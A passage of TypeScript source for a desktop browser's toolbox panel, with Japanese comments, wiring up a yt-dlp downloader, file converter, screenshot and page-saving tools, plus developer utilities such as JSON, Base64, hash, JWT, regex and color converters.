      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      const src = dt.getData("text/x-yuzu-tool");
      btn.classList.remove("drag-over");
      if (!src || !navParent) return;
      e.preventDefault();
      const srcEl = navParent.querySelector(
        `.toolbox-nav-item[data-tool="${src}"]`,
      ) as HTMLElement | null;
      if (!srcEl || srcEl === btn) return;
      // 別カテゴリへの drop は無視。
      if (categoryOf(srcEl) !== categoryOf(btn)) return;
      const r = btn.getBoundingClientRect();
      const dropEv = e as DragEvent;
      const before = dropEv.clientY < r.top + r.height / 2;
      navParent.insertBefore(srcEl, before ? btn : btn.nextSibling);
      persistToolOrder();
    });
  });
  ytdlpFillBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (a && ytdlpUrlInput) ytdlpUrlInput.value = a.url;
  });
  // 形式に応じて画質を表示/非表示
  const qualityWrap = document.getElementById(
    "ytdlp-quality-wrap",
  ) as HTMLElement | null;
  const updateQualityVisibility = (): void => {
    if (!qualityWrap) return;
    qualityWrap.style.display = ytdlpModeSel?.value === "audio" ? "none" : "";
  };
  ytdlpModeSel?.addEventListener("change", updateQualityVisibility);
  updateQualityVisibility();
  ytdlpPickDirBtn?.addEventListener("click", async () => {
    try {
      const initial = ytdlpDirInput?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial,
      });
      if (chosen && ytdlpDirInput) {
        ytdlpDirInput.value = chosen;
        await saveToolboxSettings();
      }
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });
  // 設定変更時に保存
  ytdlpDirInput?.addEventListener("change", () => void saveToolboxSettings());

  ytdlpRunBtn?.addEventListener("click", async () => {
    const url = (ytdlpUrlInput?.value ?? "").trim();
    if (!url) {
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = "URL を入力してください";
      return;
    }
    await saveToolboxSettings();
    if (ytdlpLogEl) ytdlpLogEl.textContent = "";
    if (ytdlpStatusEl) ytdlpStatusEl.textContent = "起動中…";
    if (ytdlpRunBtn) ytdlpRunBtn.disabled = true;
    if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = false;
    try {
      const id = await invoke<number>("toolbox_ytdlp_run", {
        args: {
          url,
          mode: ytdlpModeSel?.value ?? "video",
          quality: ytdlpQualitySel?.value ?? "best",
        },
      });
      currentJobId = id;
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = `実行中 (job ${id})`;
    } catch (e) {
      const msg = String(e);
      appendYtdlpLog(`エラー: ${msg}`, "stderr");
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = "エラー";
      if (ytdlpRunBtn) ytdlpRunBtn.disabled = false;
      if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = true;
    }
  });
  ytdlpCancelBtn?.addEventListener("click", () => {
    if (currentJobId === null) return;
    void invoke("toolbox_ytdlp_cancel", { jobId: currentJobId }).catch((e) =>
      console.error("toolbox_ytdlp_cancel failed:", e),
    );
  });

  // バックエンドからの進捗イベント
  void listen<{ job_id: number; line: string; kind: string }>(
    "toolbox-ytdlp-progress",
    (event) => {
      appendYtdlpLog(event.payload.line, event.payload.kind);
    },
  );
  void listen<{ job_id: number; success: boolean; code: number | null }>(
    "toolbox-ytdlp-done",
    (event) => {
      const p = event.payload;
      const txt = p.success ? "完了" : `失敗 (exit ${p.code ?? "?"})`;
      appendYtdlpLog(`--- ${txt} ---`, "info");
      if (ytdlpStatusEl) ytdlpStatusEl.textContent = txt;
      if (ytdlpRunBtn) ytdlpRunBtn.disabled = false;
      if (ytdlpCancelBtn) ytdlpCancelBtn.disabled = true;
      currentJobId = null;
    },
  );

  setupConverter();
  setupVolumeBoost();
  setupSaveHtml();
  setupReader();
  setupScreenshot();
  setupJsonTool();
  setupBase64Tool();
  setupUrlCodecTool();
  setupHashTool();
  setupUuidTool();
  setupTimestampTool();
  setupRegexTool();
  setupJwtTool();
  setupColorTool();
  setupDiffTool();
  setupUserAgentTool();
  setupScrapeTool();
  setupUnzipTool();
  setupFileMetaTool();
  setupAudioTagsTool();
  setupGenericMetaTool();
  setupMiniGameTool();
  setupAITool();
  setupUserScriptTool();
  setupTechProfileTool();
  setupOGPTool();
  setupPentestTool();
  setupImageStudioTool();
  // setupVideoStudioTool(); // 動画スタジオは廃止
  setupSpeedtestTool();
  setupCharCountTool();
  setupTodoTool();
  setupClockTool();
  setupTerminalTool();
  setupSshTool();
  setupCpsTool();
}

// ===== ファイル形式コンバータ =====

let convInputEl: HTMLInputElement | null = null;
let convOutEl: HTMLInputElement | null = null;
let convFormatSel: HTMLSelectElement | null = null;
let convRunBtn: HTMLButtonElement | null = null;
let convCancelBtn: HTMLButtonElement | null = null;
let convLogEl: HTMLPreElement | null = null;
let convStatusEl: HTMLSpanElement | null = null;
let convJobId: number | null = null;

function appendConvLog(line: string, kind: string): void {
  if (!convLogEl) return;
  const span = document.createElement("span");
  if (kind === "stderr") span.className = "log-stderr";
  else if (kind === "info") span.className = "log-info";
  span.textContent = line + "\n";
  convLogEl.appendChild(span);
  convLogEl.scrollTop = convLogEl.scrollHeight;
}

function setupConverter(): void {
  convInputEl = document.getElementById(
    "conv-input",
  ) as HTMLInputElement | null;
  convOutEl = document.getElementById("conv-out") as HTMLInputElement | null;
  convFormatSel = document.getElementById(
    "conv-format",
  ) as HTMLSelectElement | null;
  convRunBtn = document.getElementById("conv-run") as HTMLButtonElement | null;
  convCancelBtn = document.getElementById(
    "conv-cancel",
  ) as HTMLButtonElement | null;
  convLogEl = document.getElementById("conv-log") as HTMLPreElement | null;
  convStatusEl = document.getElementById(
    "conv-status",
  ) as HTMLSpanElement | null;
  const pickInBtn = document.getElementById(
    "conv-pick-input",
  ) as HTMLButtonElement | null;
  const pickOutBtn = document.getElementById(
    "conv-pick-out",
  ) as HTMLButtonElement | null;

  pickInBtn?.addEventListener("click", async () => {
    try {
      const initial = convInputEl?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_file", {
        initial,
      });
      if (chosen && convInputEl) convInputEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_file failed:", e);
    }
  });
  pickOutBtn?.addEventListener("click", async () => {
    try {
      const initial = convOutEl?.value ?? "";
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial,
      });
      if (chosen && convOutEl) convOutEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  convRunBtn?.addEventListener("click", async () => {
    const input = (convInputEl?.value ?? "").trim();
    if (!input) {
      if (convStatusEl)
        convStatusEl.textContent = "入力ファイルを指定してください";
      return;
    }
    if (convLogEl) convLogEl.textContent = "";
    if (convStatusEl) convStatusEl.textContent = "起動中…";
    if (convRunBtn) convRunBtn.disabled = true;
    if (convCancelBtn) convCancelBtn.disabled = false;
    try {
      const id = await invoke<number>("toolbox_convert_run", {
        args: {
          input,
          format: convFormatSel?.value ?? "mp4",
          out_dir: convOutEl?.value ?? "",
        },
      });
      convJobId = id;
      if (convStatusEl) convStatusEl.textContent = `変換中 (job ${id})`;
    } catch (e) {
      const msg = String(e);
      appendConvLog(`エラー: ${msg}`, "stderr");
      if (convStatusEl) convStatusEl.textContent = "エラー";
      if (convRunBtn) convRunBtn.disabled = false;
      if (convCancelBtn) convCancelBtn.disabled = true;
    }
  });
  convCancelBtn?.addEventListener("click", () => {
    if (convJobId === null) return;
    void invoke("toolbox_convert_cancel", { jobId: convJobId }).catch((e) =>
      console.error("toolbox_convert_cancel failed:", e),
    );
  });

  void listen<{ job_id: number; line: string; kind: string }>(
    "toolbox-conv-progress",
    (event) => {
      appendConvLog(event.payload.line, event.payload.kind);
    },
  );
  void listen<{
    job_id: number;
    success: boolean;
    code: number | null;
    output_path: string | null;
  }>("toolbox-conv-done", (event) => {
    const p = event.payload;
    const txt = p.success ? "完了" : `失敗 (exit ${p.code ?? "?"})`;
    appendConvLog(`--- ${txt} ---`, "info");
    if (p.success && p.output_path) {
      appendConvLog(`出力: ${p.output_path}`, "info");
    }
    if (convStatusEl) convStatusEl.textContent = txt;
    if (convRunBtn) convRunBtn.disabled = false;
    if (convCancelBtn) convCancelBtn.disabled = true;
    convJobId = null;
  });
}

// ===== 動画音量ブースト =====

function setupVolumeBoost(): void {
  const range = document.getElementById(
    "vboost-range",
  ) as HTMLInputElement | null;
  const valueEl = document.getElementById(
    "vboost-value",
  ) as HTMLSpanElement | null;
  const applyBtn = document.getElementById(
    "vboost-apply",
  ) as HTMLButtonElement | null;
  const resetBtn = document.getElementById(
    "vboost-reset",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "vboost-status",
  ) as HTMLSpanElement | null;
  if (!range || !valueEl) return;

  const updateLabel = (): void => {
    valueEl.textContent = `${range.value}%`;
  };
  range.addEventListener("input", updateLabel);
  updateLabel();

  const apply = async (gainPct: number): Promise<void> => {
    if (statusEl) statusEl.textContent = "適用中…";
    try {
      await invoke("view_set_volume_boost", { gain: gainPct / 100 });
      if (statusEl) statusEl.textContent = `適用済み (${gainPct}%)`;
    } catch (e) {
      console.error("view_set_volume_boost failed:", e);
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  };

  applyBtn?.addEventListener("click", () => {
    void apply(parseInt(range.value, 10) || 100);
  });
  resetBtn?.addEventListener("click", () => {
    range.value = "100";
    updateLabel();
    void apply(100);
  });
}

// ===== ページ HTML 保存 =====

function setupSaveHtml(): void {
  const urlEl = document.getElementById(
    "savehtml-url",
  ) as HTMLInputElement | null;
  const dirEl = document.getElementById(
    "savehtml-dir",
  ) as HTMLInputElement | null;
  const fillBtn = document.getElementById(
    "savehtml-fill-current",
  ) as HTMLButtonElement | null;
  const pickDirBtn = document.getElementById(
    "savehtml-pick-dir",
  ) as HTMLButtonElement | null;
  const runBtn = document.getElementById(
    "savehtml-run",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "savehtml-status",
  ) as HTMLSpanElement | null;
  const logEl = document.getElementById(
    "savehtml-log",
  ) as HTMLPreElement | null;
  if (!urlEl || !dirEl || !runBtn) return;

  // ダウンロードディレクトリを初期値に
  void (async () => {
    try {
      const def = await invoke<string>("toolbox_default_download_dir");
      if (def && !dirEl.value) dirEl.value = def;
    } catch {
      /* noop */
    }
  })();

  fillBtn?.addEventListener("click", () => {
    const a = activeTab();
    if (a) urlEl.value = a.url;
  });

  pickDirBtn?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dirEl.value || null,
      });
      if (chosen) dirEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  const appendLog = (line: string, kind: "info" | "err" = "info"): void => {
    if (!logEl) return;
    const span = document.createElement("span");
    span.className = kind === "err" ? "log-stderr" : "log-info";
    span.textContent = line + "\n";
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
  };

  runBtn.addEventListener("click", async () => {
    const url = urlEl.value.trim();
    const dir = dirEl.value.trim();
    const modeEl = document.getElementById(
      "savehtml-mode",
    ) as HTMLSelectElement | null;
    const mode = modeEl?.value === "active" ? "active" : "fetch";
    if (mode === "fetch" && !url) {
      if (statusEl) statusEl.textContent = "URL を入力してください";
      return;
    }
    if (!dir) {
      if (statusEl) statusEl.textContent = "保存先を選択してください";
      return;
    }
    runBtn.disabled = true;
    if (statusEl) statusEl.textContent = "保存中…";
    appendLog(
      mode === "active" ? "アクティブタブのDOMを取得中…" : `取得中: ${url}`,
    );
    try {
      const path =
        mode === "active"
          ? await invoke<string>("toolbox_save_active_page_html", { dir })
          : await invoke<string>("toolbox_save_page_html", { url, dir });
      if (statusEl) statusEl.textContent = "保存しました";
      appendLog(`保存: ${path}`);
    } catch (e) {
      const msg = String(e);
      if (statusEl) statusEl.textContent = `エラー: ${msg}`;
      appendLog(msg, "err");
    } finally {
      runBtn.disabled = false;
    }
  });
}

// ===== リーディングモード =====

function setupReader(): void {
  const applyBtn = document.getElementById(
    "reader-apply",
  ) as HTMLButtonElement | null;
  const disableBtn = document.getElementById(
    "reader-disable",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "reader-status",
  ) as HTMLSpanElement | null;
  if (!applyBtn || !disableBtn) return;

  applyBtn.addEventListener("click", async () => {
    if (statusEl) statusEl.textContent = "適用中…";
    try {
      await invoke("view_set_reader_mode", { enabled: true });
      if (statusEl) statusEl.textContent = "適用しました";
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
  disableBtn.addEventListener("click", async () => {
    try {
      await invoke("view_set_reader_mode", { enabled: false });
      if (statusEl) statusEl.textContent = "解除しました";
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== スクリーンショット =====

function setupScreenshot(): void {
  const dirEl = document.getElementById(
    "screenshot-dir",
  ) as HTMLInputElement | null;
  const pickBtn = document.getElementById(
    "screenshot-pick-dir",
  ) as HTMLButtonElement | null;
  const runBtn = document.getElementById(
    "screenshot-run",
  ) as HTMLButtonElement | null;
  const statusEl = document.getElementById(
    "screenshot-status",
  ) as HTMLSpanElement | null;
  if (!dirEl || !runBtn) return;

  void (async () => {
    try {
      const def = await invoke<string>("toolbox_default_download_dir");
      if (def && !dirEl.value) dirEl.value = def;
    } catch {
      /* noop */
    }
  })();

  pickBtn?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dirEl.value || null,
      });
      if (chosen) dirEl.value = chosen;
    } catch (e) {
      console.error("toolbox_pick_download_dir failed:", e);
    }
  });

  runBtn.addEventListener("click", async () => {
    const dir = dirEl.value.trim();
    if (!dir) {
      if (statusEl) statusEl.textContent = "保存先を選択してください";
      return;
    }
    const modeEl = document.getElementById(
      "screenshot-mode",
    ) as HTMLSelectElement | null;
    const mode = modeEl?.value === "viewport" ? "viewport" : "full";
    runBtn.disabled = true;
    if (statusEl)
      statusEl.textContent =
        mode === "full" ? "ページ全体を撮影中…" : "撮影中…";
    try {
      const dataUrl =
        mode === "full"
          ? await invoke<string>("toolbox_screenshot_full_page")
          : await invoke<string>("toolbox_screenshot");
      if (statusEl) statusEl.textContent = "保存中…";
      const path = await invoke<string>("toolbox_save_data_url", {
        dir,
        dataUrl,
      });
      if (statusEl) statusEl.textContent = `保存: ${path}`;
    } catch (e) {
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    } finally {
      runBtn.disabled = false;
    }
  });
}

// ===== 開発者向けツール群 =====

function $id<T extends HTMLElement>(id: string): T | null {
  return document.getElementById(id) as T | null;
}

// JSON 整形 / 検証
function setupJsonTool(): void {
  const input = $id<HTMLTextAreaElement>("json-input");
  const output = $id<HTMLTextAreaElement>("json-output");
  const status = $id<HTMLSpanElement>("json-status");
  const fmt2 = $id<HTMLButtonElement>("json-format");
  const fmt4 = $id<HTMLButtonElement>("json-format-4");
  const minify = $id<HTMLButtonElement>("json-minify");
  const sortBtn = $id<HTMLButtonElement>("json-sort");
  const copyBtn = $id<HTMLButtonElement>("json-copy");
  if (!input || !output) return;

  const sortKeys = (v: unknown): unknown => {
    if (Array.isArray(v)) return v.map(sortKeys);
    if (v && typeof v === "object") {
      const o = v as Record<string, unknown>;
      const out: Record<string, unknown> = {};
      for (const k of Object.keys(o).sort()) out[k] = sortKeys(o[k]);
      return out;
    }
    return v;
  };
  const run = (mode: "2" | "4" | "min" | "sort"): void => {
    try {
      const parsed = JSON.parse(input.value);
      const v = mode === "sort" ? sortKeys(parsed) : parsed;
      let text: string;
      if (mode === "min") text = JSON.stringify(v);
      else if (mode === "4") text = JSON.stringify(v, null, 4);
      else text = JSON.stringify(v, null, 2);
      output.value = text;
      if (status) {
        status.textContent = `OK (${text.length} 文字)`;
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      output.value = "";
      if (status) {
        status.textContent = `エラー: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
  };
  fmt2?.addEventListener("click", () => run("2"));
  fmt4?.addEventListener("click", () => run("4"));
  minify?.addEventListener("click", () => run("min"));
  sortBtn?.addEventListener("click", () => run("sort"));
  copyBtn?.addEventListener("click", () => {
    void navigator.clipboard.writeText(output.value);
    if (status) status.textContent = "コピーしました";
  });
}

// Base64
function setupBase64Tool(): void {
  const plain = $id<HTMLTextAreaElement>("b64-plain");
  const enc = $id<HTMLTextAreaElement>("b64-encoded");
  const urlsafe = $id<HTMLInputElement>("b64-urlsafe");
  const status = $id<HTMLSpanElement>("b64-status");
  if (!plain || !enc || !urlsafe) return;
  let updating = false;
  const enc2url = (s: string): string =>
    s.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  const url2enc = (s: string): string => {
    let r = s.replace(/-/g, "+").replace(/_/g, "/");
    while (r.length % 4) r += "=";
    return r;
  };
  const fromPlain = (): void => {
    if (updating) return;
    updating = true;
    try {
      const bytes = new TextEncoder().encode(plain.value);
      let bin = "";
      for (const b of bytes) bin += String.fromCharCode(b);
      let out = btoa(bin);
      if (urlsafe.checked) out = enc2url(out);
      enc.value = out;
      if (status) {
        status.textContent = "";
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = String(e);
        status.classList.add("toolbox-error");
      }
    }
    updating = false;
  };
  const fromEnc = (): void => {
    if (updating) return;
    updating = true;
    try {
      const src = urlsafe.checked ? url2enc(enc.value) : enc.value;
      const bin = atob(src.trim());
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      plain.value = new TextDecoder().decode(bytes);
      if (status) {
        status.textContent = "";
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = `デコード失敗: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
    updating = false;
  };
  plain.addEventListener("input", fromPlain);
  enc.addEventListener("input", fromEnc);
  urlsafe.addEventListener("change", fromPlain);
}

// URL エンコード
function setupUrlCodecTool(): void {
  const plain = $id<HTMLTextAreaElement>("url-plain");
  const enc = $id<HTMLTextAreaElement>("url-encoded");
  const comp = $id<HTMLInputElement>("url-component");
  const parseEl = $id<HTMLInputElement>("url-parse");
  const parsed = $id<HTMLPreElement>("url-parsed");
  const status = $id<HTMLSpanElement>("url-status");
  if (!plain || !enc || !comp || !parseEl || !parsed) return;
  let updating = false;
  const fromPlain = (): void => {
    if (updating) return;
    updating = true;
    try {
      enc.value = comp.checked
        ? encodeURIComponent(plain.value)
        : encodeURI(plain.value);
      if (status) status.textContent = "";
    } catch (e) {
      if (status) status.textContent = String(e);
    }
    updating = false;
  };
  const fromEnc = (): void => {
    if (updating) return;
    updating = true;
    try {
      plain.value = comp.checked
        ? decodeURIComponent(enc.value)
        : decodeURI(enc.value);
      if (status) status.textContent = "";
    } catch (e) {
      if (status) status.textContent = `デコード失敗: ${String(e)}`;
    }
    updating = false;
  };
  plain.addEventListener("input", fromPlain);
  enc.addEventListener("input", fromEnc);
  comp.addEventListener("change", fromPlain);

  parseEl.addEventListener("input", () => {
    const v = parseEl.value.trim();
    if (!v) {
      parsed.textContent = "";
      return;
    }
    try {
      const u = new URL(v);
      const params: Record<string, string[]> = {};
      u.searchParams.forEach((val, key) => {
        if (!params[key]) params[key] = [];
        params[key].push(val);
      });
      const obj = {
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port,
        pathname: u.pathname,
        search: u.search,
        hash: u.hash,
        username: u.username,
        password: u.password,
        params,
      };
      parsed.textContent = JSON.stringify(obj, null, 2);
    } catch (e) {
      parsed.textContent = `解析失敗: ${String(e)}`;
    }
  });
}

// ハッシュ
function setupHashTool(): void {
  const input = $id<HTMLTextAreaElement>("hash-input");
  const out1 = $id<HTMLPreElement>("hash-sha1");
  const out256 = $id<HTMLPreElement>("hash-sha256");
  const out384 = $id<HTMLPreElement>("hash-sha384");
  const out512 = $id<HTMLPreElement>("hash-sha512");
  if (!input || !out1 || !out256 || !out384 || !out512) return;
  const hex = (buf: ArrayBuffer): string =>
    Array.from(new Uint8Array(buf))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");
  let token = 0;
  const update = async (): Promise<void> => {
    const my = ++token;
    const data = new TextEncoder().encode(input.value);
    const [a, b, c, d] = await Promise.all([
      crypto.subtle.digest("SHA-1", data),
      crypto.subtle.digest("SHA-256", data),
      crypto.subtle.digest("SHA-384", data),
      crypto.subtle.digest("SHA-512", data),
    ]);
    if (my !== token) return;
    out1.textContent = hex(a);
    out256.textContent = hex(b);
    out384.textContent = hex(c);
    out512.textContent = hex(d);
  };
  input.addEventListener("input", () => void update());
  void update();
}

// UUID
function setupUuidTool(): void {
  const count = $id<HTMLInputElement>("uuid-count");
  const upper = $id<HTMLInputElement>("uuid-uppercase");
  const noh = $id<HTMLInputElement>("uuid-nohyphen");
  const out = $id<HTMLTextAreaElement>("uuid-output");
  const gen = $id<HTMLButtonElement>("uuid-generate");
  const copy = $id<HTMLButtonElement>("uuid-copy");
  if (!count || !out || !gen) return;
  const uuid4 = (): string => {
    if (typeof crypto.randomUUID === "function") return crypto.randomUUID();
    const b = crypto.getRandomValues(new Uint8Array(16));
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    const h = Array.from(b, (x) => x.toString(16).padStart(2, "0"));
    return `${h.slice(0, 4).join("")}-${h.slice(4, 6).join("")}-${h.slice(6, 8).join("")}-${h.slice(8, 10).join("")}-${h.slice(10, 16).join("")}`;
  };
  const run = (): void => {
    const n = Math.max(1, Math.min(1000, parseInt(count.value, 10) || 1));
    const arr: string[] = [];
    for (let i = 0; i < n; i++) {
      let u = uuid4();
      if (noh?.checked) u = u.replace(/-/g, "");
      if (upper?.checked) u = u.toUpperCase();
      arr.push(u);
    }
    out.value = arr.join("\n");
  };
  gen.addEventListener("click", run);
  copy?.addEventListener("click", () => {
    void navigator.clipboard.writeText(out.value);
  });
  run();
}

// タイムスタンプ
function setupTimestampTool(): void {
  const now = $id<HTMLPreElement>("ts-now");
  const refresh = $id<HTMLButtonElement>("ts-now-refresh");
  const unix = $id<HTMLInputElement>("ts-unix");
  const unixNow = $id<HTMLButtonElement>("ts-unix-now");
  const iso = $id<HTMLInputElement>("ts-iso");
  const local = $id<HTMLPreElement>("ts-local");
  const utc = $id<HTMLPreElement>("ts-utc");
  const ms = $id<HTMLPreElement>("ts-ms");
  if (!now || !unix || !iso || !local || !utc || !ms) return;
  let updating = false;
  const showNow = (): void => {
    const d = new Date();
    now.textContent = `${d.toISOString()}  /  unix=${Math.floor(d.getTime() / 1000)}`;
  };
  const fillFrom = (d: Date): void => {
    if (Number.isNaN(d.getTime())) {
      local.textContent = utc.textContent = ms.textContent = "(不正)";
      return;
    }
    local.textContent = d.toString();
    utc.textContent = d.toUTCString();
    ms.textContent = String(d.getTime());
  };
  unix.addEventListener("input", () => {
    if (updating) return;
    updating = true;
    const v = parseFloat(unix.value);
    if (Number.isFinite(v)) {
      const d = new Date(v * 1000);
      iso.value = d.toISOString();
      fillFrom(d);
    }
    updating = false;
  });
  iso.addEventListener("input", () => {
    if (updating) return;
    updating = true;
    const d = new Date(iso.value);
    if (!Number.isNaN(d.getTime())) {
      unix.value = String(Math.floor(d.getTime() / 1000));
      fillFrom(d);
    } else {
      fillFrom(d);
    }
    updating = false;
  });
  unixNow?.addEventListener("click", () => {
    unix.value = String(Math.floor(Date.now() / 1000));
    unix.dispatchEvent(new Event("input"));
  });
  refresh?.addEventListener("click", showNow);
  showNow();
}

// 正規表現
function setupRegexTool(): void {
  const pat = $id<HTMLInputElement>("regex-pattern");
  const flags = $id<HTMLInputElement>("regex-flags");
  const input = $id<HTMLTextAreaElement>("regex-input");
  const status = $id<HTMLSpanElement>("regex-status");
  const hl = $id<HTMLPreElement>("regex-highlight");
  const list = $id<HTMLPreElement>("regex-matches");
  if (!pat || !flags || !input || !hl || !list) return;
  const escapeHtml = (s: string): string =>
    s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const run = (): void => {
    if (!pat.value) {
      hl.innerHTML = escapeHtml(input.value);
      list.textContent = "";
      if (status) status.textContent = "";
      return;
    }
    let f = flags.value;
    if (!f.includes("g")) f += "g";
    let re: RegExp;
    try {
      re = new RegExp(pat.value, f);
    } catch (e) {
      if (status) {
        status.textContent = `パターンエラー: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
      hl.textContent = "";
      list.textContent = "";
      return;
    }
    if (status) {
      status.classList.remove("toolbox-error");
    }
    const text = input.value;
    const matches: RegExpExecArray[] = [];
    let m: RegExpExecArray | null;
    let safety = 0;
    while ((m = re.exec(text))) {
      matches.push(m);
      if (m[0].length === 0) re.lastIndex++;
      if (++safety > 10000) break;
    }
    if (status) status.textContent = `${matches.length} 件マッチ`;
    let html = "";
    let last = 0;
    for (const mm of matches) {
      const start = mm.index;
      const end = start + mm[0].length;
      html += escapeHtml(text.slice(last, start));
      html += `<span class="regex-match-mark">${escapeHtml(mm[0])}</span>`;
      last = end;
    }
    html += escapeHtml(text.slice(last));
    hl.innerHTML = html;
    list.textContent = matches
      .map((mm, i) => {
        const groups =
          mm.length > 1 ? `  groups=${JSON.stringify(mm.slice(1))}` : "";
        return `${i + 1}: [${mm.index}] "${mm[0]}"${groups}`;
      })
      .join("\n");
  };
  pat.addEventListener("input", run);
  flags.addEventListener("input", run);
  input.addEventListener("input", run);
}

// JWT
function setupJwtTool(): void {
  const input = $id<HTMLTextAreaElement>("jwt-input");
  const header = $id<HTMLPreElement>("jwt-header");
  const payload = $id<HTMLPreElement>("jwt-payload");
  const status = $id<HTMLSpanElement>("jwt-status");
  if (!input || !header || !payload) return;
  const b64urlDecode = (s: string): string => {
    let r = s.replace(/-/g, "+").replace(/_/g, "/");
    while (r.length % 4) r += "=";
    const bin = atob(r);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder().decode(bytes);
  };
  const pretty = (s: string): string => {
    try {
      return JSON.stringify(JSON.parse(s), null, 2);
    } catch {
      return s;
    }
  };
  const run = (): void => {
    const t = input.value.trim();
    if (!t) {
      header.textContent = payload.textContent = "";
      if (status) status.textContent = "";
      return;
    }
    const parts = t.split(".");
    if (parts.length < 2) {
      if (status) {
        status.textContent = "JWT の形式ではありません";
        status.classList.add("toolbox-error");
      }
      return;
    }
    try {
      header.textContent = pretty(b64urlDecode(parts[0]));
      payload.textContent = pretty(b64urlDecode(parts[1]));
      if (status) {
        status.textContent = `OK (署名=${parts[2] ? "あり" : "なし"})`;
        status.classList.remove("toolbox-error");
      }
    } catch (e) {
      if (status) {
        status.textContent = `デコード失敗: ${String(e)}`;
        status.classList.add("toolbox-error");
      }
    }
  };
  input.addEventListener("input", run);
}

// カラー
function setupColorTool(): void {
  const swatch = $id<HTMLDivElement>("color-swatch");
  const picker = $id<HTMLInputElement>("color-picker");
  const hex = $id<HTMLInputElement>("color-hex");
  const rgb = $id<HTMLInputElement>("color-rgb");
  const hsl = $id<HTMLInputElement>("color-hsl");
  const status = $id<HTMLSpanElement>("color-status");
  if (!swatch || !picker || !hex || !rgb || !hsl) return;
  let updating = false;
  const rgbToHsl = (
    r: number,
    g: number,
    b: number,
  ): [number, number, number] => {
    r /= 255;
    g /= 255;
    b /= 255;
    const max = Math.max(r, g, b);
    const min = Math.min(r, g, b);
    let h = 0;
    let s = 0;
    const l = (max + min) / 2;
    if (max !== min) {
      const d = max - min;
      s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
      switch (max) {
        case r:
          h = (g - b) / d + (g < b ? 6 : 0);
          break;
        case g:
          h = (b - r) / d + 2;
          break;
        default:
          h = (r - g) / d + 4;
      }
      h *= 60;
    }
    return [Math.round(h), Math.round(s * 100), Math.round(l * 100)];
  };
  const hslToRgb = (
    h: number,
    s: number,
    l: number,
  ): [number, number, number] => {
    s /= 100;
    l /= 100;
    const k = (n: number): number => (n + h / 30) % 12;
    const a = s * Math.min(l, 1 - l);
    const f = (n: number): number =>
      l - a * Math.max(-1, Math.min(k(n) - 3, Math.min(9 - k(n), 1)));
    return [
      Math.round(f(0) * 255),
      Math.round(f(8) * 255),
      Math.round(f(4) * 255),
    ];
  };
  const apply = (r: number, g: number, b: number): void => {
    const cl = (x: number): number => Math.max(0, Math.min(255, Math.round(x)));
    r = cl(r);
    g = cl(g);
    b = cl(b);
    const h = `#${[r, g, b].map((x) => x.toString(16).padStart(2, "0")).join("")}`;
    const [hh, ss, ll] = rgbToHsl(r, g, b);
    updating = true;
    hex.value = h;
    rgb.value = `rgb(${r}, ${g}, ${b})`;
    hsl.value = `hsl(${hh}, ${ss}%, ${ll}%)`;
    picker.value = h;
    swatch.style.background = h;
    if (status) {
      status.textContent = "";
      status.classList.remove("toolbox-error");
    }
    updating = false;
  };
  const err = (msg: string): void => {
    if (status) {
      status.textContent = msg;
      status.classList.add("toolbox-error");
    }
  };
  hex.addEventListener("input", () => {
    if (updating) return;
    let v = hex.value.trim().replace(/^#/, "");
    if (v.length === 3)
      v = v
        .split("")
        .map((c) => c + c)
        .join("");
    if (!/^[0-9a-fA-F]{6}$/.test(v)) {
      err("HEX 不正");
      return;
    }
    apply(
      parseInt(v.slice(0, 2), 16),
      parseInt(v.slice(2, 4), 16),
      parseInt(v.slice(4, 6), 16),
    );
  });
  rgb.addEventListener("input", () => {
    if (updating) return;
    const m = rgb.value.match(/(\d+)\s*,\s*(\d+)\s*,\s*(\d+)/);
    if (!m) {
      err("RGB 不正");
      return;
    }
    apply(+m[1], +m[2], +m[3]);
  });
  hsl.addEventListener("input", () => {
    if (updating) return;
    const m = hsl.value.match(
